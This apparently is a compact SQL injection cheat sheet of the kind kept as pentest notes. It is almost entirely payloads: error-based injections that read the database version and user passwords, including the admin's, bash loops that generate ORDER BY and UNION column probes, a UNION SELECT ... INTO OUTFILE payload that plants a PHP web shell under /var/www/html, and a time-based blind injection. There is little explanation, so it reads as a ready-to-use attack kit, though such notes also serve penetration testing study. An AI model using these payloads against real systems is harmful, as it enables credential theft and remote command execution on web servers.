
### Error-based SQL injection 

```sql

d2cy' OR 1=1 -- //
d2cy' or 1=1 in (select @@version) -- //
d2cy' or 1=1 in (select version()) == //

' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

```

### UNION Based SQL injection

#### Find no. of columns
```bash

for i in {1..5}; do echo -n "' ORDER BY $i-- //\n"; done    #  Generate ' ORDER BY x-- //

for i in {1..5}; do echo "' UNION SELECT $(printf 'null,'%.0s {1..$i})null-- -"; done    # Generate UNION SELECT null,null-- - 

```

#### Upload Shell

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

### Blind SQLi

```sql
' AND IF (1=1, sleep(3),'false') -- //

```

